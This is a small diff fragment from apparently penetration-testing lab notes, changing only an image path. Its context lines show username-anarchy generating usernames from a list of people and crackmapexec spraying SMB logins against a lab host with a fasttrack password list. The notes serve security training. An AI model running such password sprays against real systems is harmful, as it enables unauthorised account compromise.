@@ -132,7 +132,7 @@ _**On an engagement you have gone on several social media sites and found the In
 ./username-anarchy/username-anarchy -i listofpeaople.txt > lastusername.txt
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 crackmapexec smb 10.129.202.85 -u lastusername.txt -p fasttrack.txt
